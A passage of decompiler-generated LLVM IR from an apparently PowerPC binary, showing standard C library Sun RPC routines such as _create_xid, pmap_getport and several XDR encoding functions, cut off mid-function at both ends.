  %v3_10010028 = inttoptr i32 %v2_10010028 to i32*
  store i32 2, i32* %v3_10010028, align 4
  br label %dec_label_pc_1001002c

dec_label_pc_1001002c:                            ; preds = %dec_label_pc_10010000, %dec_label_pc_1000fff8, %dec_label_pc_1000ffd4, %dec_label_pc_1000ffe0, %dec_label_pc_10010024
  %v0_1001002c = load i32, i32* @r30, align 4
  %v1_1001002c = add i32 %v0_1001002c, 44
  %v2_1001002c = inttoptr i32 %v1_1001002c to i32*
  %v3_1001002c = load i32, i32* %v2_1001002c, align 4
  store i32 %v3_1001002c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010030

dec_label_pc_10010030:                            ; preds = %dec_label_pc_1000fd88, %dec_label_pc_1000fb1c, %dec_label_pc_1001002c
  %v0_10010044 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010044

; uselistorder directives
  uselistorder i32 %v0_1000fee4, { 1, 0, 2 }
  uselistorder i32 %v0_1000fd6c.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000fd60, { 1, 0 }
  uselistorder i32 %v2_1000fd40, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1000fd30, { 2, 3, 0, 1, 6, 4, 5, 7, 8 }
  uselistorder i32 %v0_1000fd24, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000fd0c, { 1, 0 }
  uselistorder i32 %v0_1000fcfc.pre, { 1, 0 }
  uselistorder i32 %v2_1000fc80, { 1, 0, 2 }
  uselistorder i32 %v0_1000fc0c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_1000ff6c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000ff58, { 1, 0, 2 }
  uselistorder i32 %v1_1000fda4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 32, 34, 33, 14, 15, 16, 17, 18, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 19, 20, 31, 0 }
  uselistorder i32* %r3.global-to-local, { 34, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 43, 25, 26, 27, 28, 30, 31, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 0, 29, 1 }
  uselistorder i32* %r24.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r22.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r21.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r19.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %r18.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32 8192, { 1, 0, 2, 3 }
  uselistorder i32 27, { 0, 1, 3, 2, 4, 5, 12, 13, 11, 14, 6, 7, 15, 8, 9, 10, 16 }
  uselistorder i32 -983040, { 1, 0 }
  uselistorder i32 1000000, { 2, 0, 1, 3 }
  uselistorder i32 8800, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 88, { 1, 2, 3, 4, 11, 12, 0, 10, 9, 5, 6, 7, 8 }
  uselistorder i32 1000, { 1, 0 }
  uselistorder label %dec_label_pc_10010030, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001002c, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000ffd4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fee0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000fd88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fd80, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fd6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000fd18, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_1000fcf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fcc4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc60, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1000fc30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fb30, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb14, { 1, 0 }
}

define i32 @_create_xid(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v2_10010060 = ptrtoint i32* %stack_var_-44 to i32
  %v4_10010074 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-44, i32 268461856, i32 ptrtoint (i32* @global_var_10030c30.395 to i32))
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r29, align 4
  store i32 268501124, i32* @lr, align 4
  %v1_10010080 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10030c30.395 to i32))
  %v3_10010084 = load i32, i32* @global_var_1002c3b4.396, align 4
  %v3_10010090 = icmp eq i32 %v3_10010084, 0
  br i1 %v3_10010090, label %dec_label_pc_10010098, label %dec_label_pc_100100bc

dec_label_pc_10010098:                            ; preds = %entry
  %v2_1001008c = ptrtoint i32* %stack_var_-52 to i32
  store i32 268501148, i32* @lr, align 4
  %v2_10010098 = call i32 @gettimeofday(i32 %v2_1001008c, i32 0)
  %v3_1001009c = load i32, i32* %stack_var_-52, align 4
  %v2_100100ac = xor i32 %v3_1001009c, %tmp
  %v2_100100b0 = trunc i32 %v2_100100ac to i16
  %v3_100100b0 = call i32 @__GI_srand48_r(i16 %v2_100100b0, i32 ptrtoint (i32* @global_var_10030c48.397 to i32))
  store i32 1, i32* @global_var_1002c3b4.396, align 4
  br label %dec_label_pc_100100bc

dec_label_pc_100100bc:                            ; preds = %entry, %dec_label_pc_10010098
  %v2_100100c0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268501196, i32* @lr, align 4
  %v2_100100c8 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_10030c48.397 to i32), i32 %v2_100100c0)
  store i32 %v2_10010060, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268501208, i32* @lr, align 4
  %v0_100100d4 = call i32 @__pthread_cleanup_pop_restore()
  %v3_100100dc = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_100100dc

; uselistorder directives
  uselistorder label %dec_label_pc_100100bc, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i16, align 2
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 400, i32* @r8, align 4
  %v3_10010110 = add i32 %arg1, 2
  %v4_10010110 = inttoptr i32 %v3_10010110 to i16*
  store i16 111, i16* %v4_10010110, align 2
  %v2_10010124 = ptrtoint i32* %stack_var_-40 to i32
  store i16 0, i16* %stack_var_-72, align 2
  store i32 %v2_10010124, i32* @r6, align 4
  %v2_10010144 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10010144, i32* @r7, align 4
  store i32 400, i32* @r9, align 4
  store i32 %arg1, i32* @r26, align 4
  store i32 -1, i32* %stack_var_-68, align 4
  store i32 5, i32* %stack_var_-40, align 4
  store i32 268501348, i32* @lr, align 4
  %v6_10010160 = call i32 @__GI_clntudp_bufcreate(i32 100000, i32 2, i32 %v2_10010124)
  store i32 %v6_10010160, i32* %r3.global-to-local, align 4
  store i32 %v6_10010160, i32* @r31, align 4
  %v3_10010164 = icmp eq i32 %v6_10010160, 0
  br i1 %v3_10010164, label %dec_label_pc_10010228, label %dec_label_pc_1001016c

dec_label_pc_1001016c:                            ; preds = %entry
  store i32 268501360, i32* @lr, align 4
  %v0_1001016c = call i32 @__GI___rpc_thread_createerr()
  store i32 0, i32* @r10, align 4
  store i32 %v0_1001016c, i32* @r30, align 4
  store i32 60, i32* %stack_var_-40, align 4
  %v2_100101bc = ptrtoint i16* %stack_var_-72 to i32
  store i32 %v2_100101bc, i32* @r8, align 4
  %v0_100101c0 = load i32, i32* @r31, align 4
  store i32 %v0_100101c0, i32* %r3.global-to-local, align 4
  %v1_100101c4 = add i32 %v0_100101c0, 4
  %v2_100101c4 = inttoptr i32 %v1_100101c4 to i32*
  %v3_100101c4 = load i32, i32* %v2_100101c4, align 4
  %v1_100101c8 = inttoptr i32 %v3_100101c4 to i32*
  %v2_100101c8 = load i32, i32* %v1_100101c8, align 4
  call void @__pseudo_call(i32 %v2_100101c8)
  %v0_100101d4 = load i32, i32* @r30, align 4
  %v0_100101d8 = load i32, i32* %r3.global-to-local, align 4
  %v3_100101d8 = icmp eq i32 %v0_100101d8, 0
  %v0_100101dc = load i32, i32* @r31, align 4
  store i32 %v0_100101dc, i32* %r3.global-to-local, align 4
  br i1 %v3_100101d8, label %dec_label_pc_10010200, label %dec_label_pc_100101e4

dec_label_pc_100101e4:                            ; preds = %dec_label_pc_1001016c
  %v2_100101e8 = inttoptr i32 %v0_100101d4 to i32*
  store i32 14, i32* %v2_100101e8, align 4
  %v0_100101ec = load i32, i32* @r31, align 4
  %v1_100101ec = add i32 %v0_100101ec, 4
  %v2_100101ec = inttoptr i32 %v1_100101ec to i32*
  %v3_100101ec = load i32, i32* %v2_100101ec, align 4
  %v1_100101f0 = add i32 %v3_100101ec, 8
  %v2_100101f0 = inttoptr i32 %v1_100101f0 to i32*
  %v3_100101f0 = load i32, i32* %v2_100101f0, align 4
  call void @__pseudo_call(i32 %v3_100101f0)
  br label %dec_label_pc_10010214

dec_label_pc_10010200:                            ; preds = %dec_label_pc_1001016c
  %v3_10010200 = load i16, i16* %stack_var_-72, align 2
  %v3_10010204 = icmp eq i16 %v3_10010200, 0
  br i1 %v3_10010204, label %dec_label_pc_1001020c, label %dec_label_pc_10010214

dec_label_pc_1001020c:                            ; preds = %dec_label_pc_10010200
  %v2_10010210 = inttoptr i32 %v0_100101d4 to i32*
  store i32 15, i32* %v2_10010210, align 4
  br label %dec_label_pc_10010214

dec_label_pc_10010214:                            ; preds = %dec_label_pc_10010200, %dec_label_pc_100101e4, %dec_label_pc_1001020c
  %v0_10010214 = load i32, i32* @r31, align 4
  %v1_10010214 = add i32 %v0_10010214, 4
  %v2_10010214 = inttoptr i32 %v1_10010214 to i32*
  %v3_10010214 = load i32, i32* %v2_10010214, align 4
  store i32 %v0_10010214, i32* %r3.global-to-local, align 4
  %v1_1001021c = add i32 %v3_10010214, 16
  %v2_1001021c = inttoptr i32 %v1_1001021c to i32*
  %v3_1001021c = load i32, i32* %v2_1001021c, align 4
  call void @__pseudo_call(i32 %v3_1001021c)
  %v3_1001022c.pre = load i16, i16* %stack_var_-72, align 2
  %phitmp = sext i16 %v3_1001022c.pre to i32
  br label %dec_label_pc_10010228

dec_label_pc_10010228:                            ; preds = %entry, %dec_label_pc_10010214
  %v3_1001022c = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_10010214 ]
  store i32 %v3_1001022c, i32* %r3.global-to-local, align 4
  %v2_10010230 = load i32, i32* @r26, align 4
  %v3_10010230 = add i32 %v2_10010230, 2
  %v4_10010230 = inttoptr i32 %v3_10010230 to i16*
  store i16 0, i16* %v4_10010230, align 2
  ret i32 %v3_1001022c

; uselistorder directives
  uselistorder i32 %v3_1001022c, { 1, 0 }
  uselistorder i16* %stack_var_-72, { 0, 3, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder label %dec_label_pc_10010228, { 1, 0 }
  uselistorder label %dec_label_pc_10010214, { 2, 0, 1 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10010248 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 268501604, i32* @lr, align 4
  %v0_10010260 = call i32 @xdr_u_long()
  %v0_10010264 = load i32, i32* @r31, align 4
  %v1_10010264 = add i32 %v0_10010264, 4
  store i32 %v1_10010264, i32* @r4, align 4
  %v3_10010268 = icmp eq i32 %v0_10010260, 0
  %v0_1001026c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1001026c, i32* @r3, align 4
  br i1 %v3_10010268, label %dec_label_pc_100102b0, label %dec_label_pc_10010274

dec_label_pc_10010274:                            ; preds = %entry
  store i32 268501624, i32* @lr, align 4
  %v0_10010274 = call i32 @xdr_u_long()
  %v0_10010278 = load i32, i32* @r31, align 4
  %v1_10010278 = add i32 %v0_10010278, 8
  store i32 %v1_10010278, i32* @r4, align 4
  %v3_1001027c = icmp eq i32 %v0_10010274, 0
  %v0_10010280 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10010280, i32* @r3, align 4
  br i1 %v3_1001027c, label %dec_label_pc_100102b0, label %dec_label_pc_10010288

dec_label_pc_10010288:                            ; preds = %dec_label_pc_10010274
  store i32 268501644, i32* @lr, align 4
  %v0_10010288 = call i32 @xdr_u_long()
  %v0_1001028c = load i32, i32* @r31, align 4
  %v1_1001028c = add i32 %v0_1001028c, 12
  store i32 %v1_1001028c, i32* @r4, align 4
  %v3_10010290 = icmp eq i32 %v0_10010288, 0
  %v0_10010294 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10010294, i32* @r3, align 4
  br i1 %v3_10010290, label %dec_label_pc_100102b0, label %dec_label_pc_1001029c

dec_label_pc_1001029c:                            ; preds = %dec_label_pc_10010288
  store i32 %v0_10010248, i32* @lr, align 4
  %v0_100102ac = call i32 @xdr_u_long()
  br label %dec_label_pc_100102b0

dec_label_pc_100102b0:                            ; preds = %dec_label_pc_10010288, %dec_label_pc_10010274, %entry, %dec_label_pc_1001029c
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_100102b0, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_100102c8 = add i32 %arg1, 8
  %v2_100102c8 = inttoptr i32 %v1_100102c8 to i32*
  %v3_100102c8 = load i32, i32* %v2_100102c8, align 4
  store i32 %v3_100102c8, i32* @r10, align 4
  %v3_100102cc = icmp eq i32 %v3_100102c8, 0
  br i1 %v3_100102cc, label %dec_label_pc_100102e0, label %dec_label_pc_100102d4

dec_label_pc_100102d4:                            ; preds = %entry
  %v3_100102d4 = icmp eq i32 %v3_100102c8, 1
  br i1 %v3_100102d4, label %dec_label_pc_10010360, label %dec_label_pc_10010398

dec_label_pc_100102e0:                            ; preds = %entry
  %v1_100102e0 = add i32 %arg1, 24
  %v2_100102e0 = inttoptr i32 %v1_100102e0 to i32*
  %v3_100102e0 = load i32, i32* %v2_100102e0, align 4
  store i32 %v3_100102e0, i32* %r11.global-to-local, align 4
  %v3_100102e4 = icmp eq i32 %v3_100102e0, 0
  br i1 %v3_100102e4, label %dec_label_pc_100102ec, label %dec_label_pc_100102f4

dec_label_pc_100102ec:                            ; preds = %dec_label_pc_100102e0
  store i32 0, i32* %arg2, align 4
  ret i32 %arg1

dec_label_pc_100102f4:                            ; preds = %dec_label_pc_100102e0
  %v2_100102f4 = icmp ugt i32 %v3_100102e0, 5
  br i1 %v2_100102f4, label %dec_label_pc_1001034c, label %dec_label_pc_100102fc

dec_label_pc_100102fc:                            ; preds = %dec_label_pc_100102f4
  %v1_10010300 = mul i32 %v3_100102e0, 4
  store i32 %v1_10010300, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001734c.405 to i32), i32* %r9.global-to-local, align 4
  %v2_10010308 = add i32 %v1_10010300, ptrtoint (i32* @global_var_1001734c.405 to i32)
  %v3_10010308 = inttoptr i32 %v2_10010308 to i32*
  %v4_10010308 = load i32, i32* %v3_10010308, align 4
  %v2_1001030c = add i32 %v4_10010308, ptrtoint (i32* @global_var_1001734c.405 to i32)
  store i32 %v2_1001030c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_1001030c)
  br label %dec_label_pc_10010324

dec_label_pc_10010324:                            ; preds = %dec_label_pc_10010360, %dec_label_pc_100102fc
  %storemerge1 = phi i32 [ 8, %dec_label_pc_100102fc ], [ 7, %dec_label_pc_10010360 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 %storemerge1, i32* %arg2, align 4
  br label %dec_label_pc_100103a8

dec_label_pc_1001034c:                            ; preds = %dec_label_pc_100102f4
  store i32 16, i32* %r0.global-to-local, align 4
  %v2_10010350 = add i32 %tmp, 4
  %v3_10010350 = inttoptr i32 %v2_10010350 to i32*
  store i32 0, i32* %v3_10010350, align 4
  %v0_10010354 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10010354, i32* %arg2, align 4
  %v0_10010358 = load i32, i32* %r11.global-to-local, align 4
  %v2_10010358 = add i32 %tmp, 8
  %v3_10010358 = inttoptr i32 %v2_10010358 to i32*
  store i32 %v0_10010358, i32* %v3_10010358, align 4
  br label %dec_label_pc_100103a8thread-pre-split

dec_label_pc_10010360:                            ; preds = %dec_label_pc_100102d4
  %v1_10010360 = add i32 %arg1, 12
  %v2_10010360 = inttoptr i32 %v1_10010360 to i32*
  %v3_10010360 = load i32, i32* %v2_10010360, align 4
  store i32 %v3_10010360, i32* %r9.global-to-local, align 4
  %v3_10010364 = icmp eq i32 %v3_10010360, 1
  br i1 %v3_10010364, label %dec_label_pc_10010324, label %dec_label_pc_1001036c

dec_label_pc_1001036c:                            ; preds = %dec_label_pc_10010360
  %v3_1001036c = icmp eq i32 %v3_10010360, 6
  br i1 %v3_1001036c, label %dec_label_pc_10010374, label %dec_label_pc_10010384

dec_label_pc_10010374:                            ; preds = %dec_label_pc_1001036c
  store i32 6, i32* %arg2, align 4
  br label %dec_label_pc_100103a8

dec_label_pc_10010384:                            ; preds = %dec_label_pc_1001036c
  store i32 16, i32* %r0.global-to-local, align 4
  %v2_10010388 = add i32 %tmp, 4
  %v3_10010388 = inttoptr i32 %v2_10010388 to i32*
  store i32 1, i32* %v3_10010388, align 4
  %v0_1001038c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1001038c, i32* %arg2, align 4
  %v0_10010390 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010390 = add i32 %tmp, 8
  %v3_10010390 = inttoptr i32 %v2_10010390 to i32*
  store i32 %v0_10010390, i32* %v3_10010390, align 4
  br label %dec_label_pc_100103a8thread-pre-split

dec_label_pc_10010398:                            ; preds = %dec_label_pc_100102d4
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 16, i32* %arg2, align 4
  %v3_100103a0 = load i32, i32* %v2_100102c8, align 4
  store i32 %v3_100103a0, i32* %r0.global-to-local, align 4
  %v2_100103a4 = add i32 %tmp, 4
  %v3_100103a4 = inttoptr i32 %v2_100103a4 to i32*
  store i32 %v3_100103a0, i32* %v3_100103a4, align 4
  br label %dec_label_pc_100103a8thread-pre-split

dec_label_pc_100103a8thread-pre-split:            ; preds = %dec_label_pc_10010398, %dec_label_pc_1001034c, %dec_label_pc_10010384
  %v2_100103a8.pr = load i32, i32* %arg2, align 4
  br label %dec_label_pc_100103a8

dec_label_pc_100103a8:                            ; preds = %dec_label_pc_100103a8thread-pre-split, %dec_label_pc_10010324, %dec_label_pc_10010374
  %v0_100103bc = phi i32 [ %v2_100103a8.pr, %dec_label_pc_100103a8thread-pre-split ], [ %storemerge1, %dec_label_pc_10010324 ], [ 6, %dec_label_pc_10010374 ]
  store i32 %v0_100103bc, i32* %r0.global-to-local, align 4
  %v3_100103ac = icmp eq i32 %v0_100103bc, 7
  br i1 %v3_100103ac, label %dec_label_pc_100103d4, label %dec_label_pc_100103b4

dec_label_pc_100103b4:                            ; preds = %dec_label_pc_100103a8
  %v3_100103b4 = icmp eq i32 %v0_100103bc, 9
  br i1 %v3_100103b4, label %dec_label_pc_100103e0, label %dec_label_pc_100103bc

dec_label_pc_100103bc:                            ; preds = %dec_label_pc_100103b4
  %v0_100103c0 = load i32, i32* @lr, align 4
  %v2_100103c0 = icmp ne i32 %v0_100103bc, 6
  call void @__pseudo_cond_branch(i1 %v2_100103c0, i32 %v0_100103c0)
  %v1_100103c4 = add i32 %arg1, 16
  %v2_100103c4 = inttoptr i32 %v1_100103c4 to i32*
  %v3_100103c4 = load i32, i32* %v2_100103c4, align 4
  store i32 %v3_100103c4, i32* %r0.global-to-local, align 4
  %v2_100103c8 = add i32 %tmp, 4
  %v3_100103c8 = inttoptr i32 %v2_100103c8 to i32*
  store i32 %v3_100103c4, i32* %v3_100103c8, align 4
  %v1_100103cc = add i32 %arg1, 20
  br label %dec_label_pc_100103ec

dec_label_pc_100103d4:                            ; preds = %dec_label_pc_100103a8
  %v1_100103d4 = add i32 %arg1, 16
  %v2_100103d4 = inttoptr i32 %v1_100103d4 to i32*
  %v3_100103d4 = load i32, i32* %v2_100103d4, align 4
  store i32 %v3_100103d4, i32* %r0.global-to-local, align 4
  %v2_100103d8 = add i32 %tmp, 4
  %v3_100103d8 = inttoptr i32 %v2_100103d8 to i32*
  store i32 %v3_100103d4, i32* %v3_100103d8, align 4
  ret i32 %arg1

dec_label_pc_100103e0:                            ; preds = %dec_label_pc_100103b4
  %v1_100103e0 = add i32 %arg1, 28
  %v2_100103e0 = inttoptr i32 %v1_100103e0 to i32*
  %v3_100103e0 = load i32, i32* %v2_100103e0, align 4
  store i32 %v3_100103e0, i32* %r0.global-to-local, align 4
  %v2_100103e4 = add i32 %tmp, 4
  %v3_100103e4 = inttoptr i32 %v2_100103e4 to i32*
  store i32 %v3_100103e0, i32* %v3_100103e4, align 4
  %v1_100103e8 = add i32 %arg1, 32
  br label %dec_label_pc_100103ec

dec_label_pc_100103ec:                            ; preds = %dec_label_pc_100103bc, %dec_label_pc_100103e0
  %storemerge.in.in = phi i32 [ %v1_100103cc, %dec_label_pc_100103bc ], [ %v1_100103e8, %dec_label_pc_100103e0 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_100103ec = add i32 %tmp, 8
  %v3_100103ec = inttoptr i32 %v2_100103ec to i32*
  store i32 %storemerge, i32* %v3_100103ec, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v0_100103bc, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10010300, { 1, 0 }
  uselistorder i32 %tmp, { 4, 6, 0, 8, 5, 2, 1, 7, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 12, 13, 1, 10, 11 }
  uselistorder i32* %arg2, { 0, 6, 5, 4, 2, 3, 1, 7 }
  uselistorder i32 %arg1, { 2, 6, 5, 4, 0, 3, 9, 7, 8, 1, 10 }
  uselistorder label %dec_label_pc_100103ec, { 1, 0 }
  uselistorder label %dec_label_pc_100103a8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100103a8thread-pre-split, { 0, 2, 1 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_100103f4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_1001040c = add i32 %arg2, 4
  %v3_1001040c = inttoptr i32 %v2_1001040c to i32*
  store i32 0, i32* %v3_1001040c, align 4
  %v2_10010414 = add i32 %arg2, 8
  %v3_10010414 = inttoptr i32 %v2_10010414 to i32*
  store i32 2, i32* %v3_10010414, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1001041c = load i32, i32* %arg1, align 4
  %v3_10010420 = icmp eq i32 %v2_1001041c, 0
  br i1 %v3_10010420, label %dec_label_pc_10010428, label %dec_label_pc_1001048c

dec_label_pc_10010428:                            ; preds = %entry
  store i32 268502060, i32* @lr, align 4
  %v0_10010428 = call i32 @xdr_u_long()
  %v3_10010430 = icmp eq i32 %v0_10010428, 0
  %v0_10010434 = load i32, i32* @r31, align 4
  store i32 %v0_10010434, i32* @r3, align 4
  br i1 %v3_10010430, label %dec_label_pc_1001048c, label %dec_label_pc_1001043c

dec_label_pc_1001043c:                            ; preds = %dec_label_pc_10010428
  store i32 268502080, i32* @lr, align 4
  %v0_1001043c = call i32 @xdr_enum()
  %v0_10010440 = load i32, i32* @r30, align 4
  %v1_10010440 = add i32 %v0_10010440, 8
  store i32 %v1_10010440, i32* @r4, align 4
  %v3_10010444 = icmp eq i32 %v0_1001043c, 0
  %v0_10010448 = load i32, i32* @r31, align 4
  store i32 %v0_10010448, i32* @r3, align 4
  br i1 %v3_10010444, label %dec_label_pc_1001048c, label %dec_label_pc_10010450

dec_label_pc_10010450:                            ; preds = %dec_label_pc_1001043c
  store i32 268502100, i32* @lr, align 4
  %v0_10010450 = call i32 @xdr_u_long()
  %v0_10010454 = load i32, i32* @r30, align 4
  %v1_10010454 = add i32 %v0_10010454, 12
  store i32 %v1_10010454, i32* @r4, align 4
  %v3_10010458 = icmp eq i32 %v0_10010450, 0
  %v0_1001045c = load i32, i32* @r31, align 4
  store i32 %v0_1001045c, i32* @r3, align 4
  br i1 %v3_10010458, label %dec_label_pc_1001048c, label %dec_label_pc_10010464

dec_label_pc_10010464:                            ; preds = %dec_label_pc_10010450
  store i32 268502120, i32* @lr, align 4
  %v0_10010464 = call i32 @xdr_u_long()
  %v0_10010468 = load i32, i32* @r30, align 4
  %v1_10010468 = add i32 %v0_10010468, 16
  store i32 %v1_10010468, i32* @r4, align 4
  %v3_1001046c = icmp eq i32 %v0_10010464, 0
  %v0_10010470 = load i32, i32* @r31, align 4
  store i32 %v0_10010470, i32* @r3, align 4
  br i1 %v3_1001046c, label %dec_label_pc_1001048c, label %dec_label_pc_10010478

dec_label_pc_10010478:                            ; preds = %dec_label_pc_10010464
  store i32 %v0_100103f4, i32* @lr, align 4
  %v0_10010488 = call i32 @xdr_u_long()
  br label %dec_label_pc_1001048c

dec_label_pc_1001048c:                            ; preds = %entry, %dec_label_pc_10010464, %dec_label_pc_10010450, %dec_label_pc_1001043c, %dec_label_pc_10010428, %dec_label_pc_10010478
  ret i32 0

; uselistorder directives
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1001048c, { 5, 1, 2, 3, 4, 0 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  %v0_100104a4 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 268502208, i32* @lr, align 4
  %v0_100104bc = call i32 @xdr_enum()
  %v3_100104c0 = icmp eq i32 %v0_100104bc, 0
  br i1 %v3_100104c0, label %dec_label_pc_1001052c, label %dec_label_pc_100104c8

dec_label_pc_100104c8:                            ; preds = %entry
  %v0_100104c8 = load i32, i32* @r31, align 4
  %v1_100104c8 = inttoptr i32 %v0_100104c8 to i32*
  %v2_100104c8 = load i32, i32* %v1_100104c8, align 4
  %v1_100104cc = add i32 %v0_100104c8, 4
  store i32 %v1_100104cc, i32* @r4, align 4
  %v0_100104d0 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100104d0, i32* @r3, align 4
  %v3_100104d4 = icmp eq i32 %v2_100104c8, 0
  br i1 %v3_100104d4, label %dec_label_pc_100104e8, label %dec_label_pc_100104e0

dec_label_pc_100104e0:                            ; preds = %dec_label_pc_100104c8
  %v3_100104d8 = icmp eq i32 %v2_100104c8, 1
  br i1 %v3_100104d8, label %dec_label_pc_10010510, label %dec_label_pc_1001052c

dec_label_pc_100104e8:                            ; preds = %dec_label_pc_100104c8
  store i32 268502252, i32* @lr, align 4
  %v0_100104e8 = call i32 @xdr_u_long()
  %v0_100104ec = load i32, i32* @r31, align 4
  %v1_100104ec = add i32 %v0_100104ec, 8
  store i32 %v1_100104ec, i32* @r4, align 4
  %v3_100104f0 = icmp eq i32 %v0_100104e8, 0
  %v0_100104f4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100104f4, i32* @r3, align 4
  br i1 %v3_100104f0, label %dec_label_pc_1001052c, label %dec_label_pc_100104fc

dec_label_pc_100104fc:                            ; preds = %dec_label_pc_100104e8
  store i32 %v0_100104a4, i32* @lr, align 4
  %v0_1001050c = call i32 @xdr_u_long()
  %v0_10010514.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010510

dec_label_pc_10010510:                            ; preds = %dec_label_pc_100104e0, %dec_label_pc_100104fc
  %v0_10010514 = phi i32 [ %v0_100104d0, %dec_label_pc_100104e0 ], [ %v0_10010514.pre, %dec_label_pc_100104fc ]
  store i32 %v0_10010514, i32* @r3, align 4
  store i32 %v0_100104a4, i32* @lr, align 4
  %v0_10010528 = call i32 @xdr_enum()
  br label %dec_label_pc_1001052c

